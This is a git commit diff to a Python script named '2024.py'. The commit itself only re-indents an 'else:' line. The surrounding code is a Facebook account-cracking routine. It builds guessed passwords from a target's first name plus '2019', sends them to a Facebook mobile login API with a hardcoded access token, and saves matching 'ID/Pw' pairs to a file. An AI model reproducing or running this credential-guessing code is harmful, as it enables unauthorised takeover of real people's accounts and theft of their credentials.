8fb140b73fc7ebf9cf150eac9d907d82cf07386f
yocors <67282781+yocors@users.noreply.github.com>
2020-07-18 02:06:01 +0200

    Update 2024.py

--- 2024.py
+++ 2024.py
@@ -504,7 +504,7 @@ def pilih_super():
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)								
-				           else:											
+				                                                                                               else:											
 					       pass12 = b['first_name']+'2019'										
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
